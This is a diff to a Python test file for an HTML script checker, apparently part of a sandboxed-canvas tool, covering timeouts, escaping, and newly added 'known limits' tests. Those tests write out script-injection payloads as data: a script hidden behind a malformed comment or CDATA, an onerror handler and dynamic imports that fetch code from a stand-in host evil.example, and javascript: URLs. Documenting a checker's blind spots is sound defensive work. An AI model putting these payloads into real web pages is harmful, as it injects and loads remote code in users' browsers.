@@ -183,7 +183,7 @@ def test_the_problems_of_one_document_are_listed_in_order():
 
 @pytest.mark.parametrize("html, count", [
     ("<SCRIPT>var = ;</SCRIPT>", 1),
-    ("<script>var = ;", 1),                                     # never closed: the browser runs it to the end
+    ("<script>var = ;", 1),                                     # never closed: still checked (a browser does not run it)
     ("<script>ok()</script ><script>var = ;</script>", 1),
     ("<div><p>text</p><script>var = ;</script></div>", 1),
 ])
@@ -200,7 +200,7 @@ def test_scripts_are_found_the_way_a_browser_finds_them(html, count):
     "<style>.a { color: red }</style>",
     "<script>var s = '</scr' + 'ipt>';</script>",
     "<script>if (a<b && c>d) { x(); }</script>",
-    '<script>var s = "a\\"b\\\\n  café \U0001F600";</script>',
+    '<script>var s = "a\\"b\\\\n\u2028 café \U0001F600";</script>',
     "<script>// a comment\nvar x = 1; /* another */</script>",
     "<script>async function f() { await g(); }</script>",
     "<script>class A { #p = 1; static s() {} }</script>",
@@ -257,15 +257,15 @@ class _Spy:
         self.ctx = RealMiniRacer()
         self.thread = threading.get_ident()
         self.closed = False
-        self.evals: list[tuple[str, int | None]] = []
+        self.evals: list[tuple[str, float | None]] = []
         _Spy.made.append(self)
 
     def set_hard_memory_limit(self, limit):
         self.ctx.set_hard_memory_limit(limit)
 
-    def eval(self, code, timeout=None):
-        self.evals.append((code, timeout))
-        return self.ctx.eval(code, timeout=timeout)
+    def eval(self, code, timeout_sec=None):
+        self.evals.append((code, timeout_sec))
+        return self.ctx.eval(code, timeout_sec=timeout_sec)
 
     def close(self):
         self.closed = True
@@ -292,15 +292,15 @@ def test_one_engine_serves_every_script_of_a_document_and_is_closed(spy):
     assert check_html_scripts("<script>a()</script><script>var = ;</script><script>b()</script>") == ["script 2 does not parse: Unexpected token '='"]
     (engine,) = spy.made
     assert engine.closed and len(engine.evals) == 3
-    assert all(timeout == 1000 for _, timeout in engine.evals)
+    assert all(timeout == 1.0 for _, timeout in engine.evals)
 
 
 def test_the_source_travels_as_data_inside_a_fixed_probe(spy):
-    check_html_scripts("<script>x = \"a\\\\b\" + ' ';</script>")
+    check_html_scripts("<script>x = \"a\\\\b\" + '\u2028';</script>")
     (engine,) = spy.made
     ((code, _),) = engine.evals
     assert code.startswith("(function (s) { try { new Function(s); return null; } catch (e) { return String(e.message); } })(")
-    assert code.endswith(")") and " " not in code                  # the line separator is escaped, so it cannot end the literal
+    assert code.endswith(")") and "\u2028" not in code                  # the line separator is escaped, so it cannot end the literal
 
 
 def test_a_top_level_return_is_the_known_blind_spot():
@@ -413,3 +413,46 @@ async def test_a_worker_thread_that_cannot_be_started_is_a_problem_not_an_except
 
     monkeypatch.setattr("primer.canvas.html_check.ThreadPoolExecutor", NoThreads)
     assert check_html_scripts(THREE_SCRIPTS) == UNCHECKED_AROUND_ONE_BAD_SOURCE
+
+
+# --- known limits: what the check cannot see. The frame's CSP blocks each of these in the browser. -------------
+
+EVIL = "https://evil.example/x.js"
+
+
+@pytest.mark.parametrize("html", [
+    f'<!--><script src="{EVIL}"></script>-->',
+    f'<!---><script src="{EVIL}"></script>-->',
+    f'<![CDATA[ x > <script src="{EVIL}"></script> ]]>',
+], ids=["<!-->", "<!--->", "<![CDATA[ x >"])
+def test_known_limit_a_script_after_an_abruptly_closed_comment_or_a_cdata_start_is_not_seen(html):
+    # A browser ends the comment (or the bogus comment that <![CDATA[ opens in HTML) at the first >, so the script is
+    # real. html.parser reads on to a later --> or ]]> and takes the script for part of the comment.
+    assert check_html_scripts(html) == []
+
+
+@pytest.mark.parametrize("html", [
+    f'<img src=x onerror="fetch(\'{EVIL}\')">',
+    '<a href="#" onclick="var = ;">go</a>',
+], ids=["a handler that fetches", "a handler that does not parse"])
+def test_known_limit_event_handler_attributes_are_not_checked(html):
+    assert check_html_scripts(html) == []
+
+
+@pytest.mark.parametrize("html", ['<a href="javascript:alert(1)">go</a>', '<iframe src="javascript:alert(1)"></iframe>'])
+def test_known_limit_javascript_urls_are_not_checked(html):
+    assert check_html_scripts(html) == []
+
+
+@pytest.mark.parametrize("html", [
+    f'<script type="module">import "{EVIL}"</script>',
+    f'<script type="module">const m = await import("{EVIL}")</script>',
+    f'<script>import("{EVIL}")</script>',
+], ids=["import in a module", "import() in a module", "import() in a classic script"])
+def test_known_limit_import_is_not_checked(html):
+    assert check_html_scripts(html) == []
+
+
+def test_known_limit_a_script_inside_a_nested_srcdoc_frame_is_not_seen():
+    assert check_html_scripts(f'<iframe srcdoc="&lt;script src=&quot;{EVIL}&quot;&gt;&lt;/script&gt;"></iframe>') == []
+    assert check_html_scripts('<iframe srcdoc="&lt;script&gt;var = ;&lt;/script&gt;"></iframe>') == []
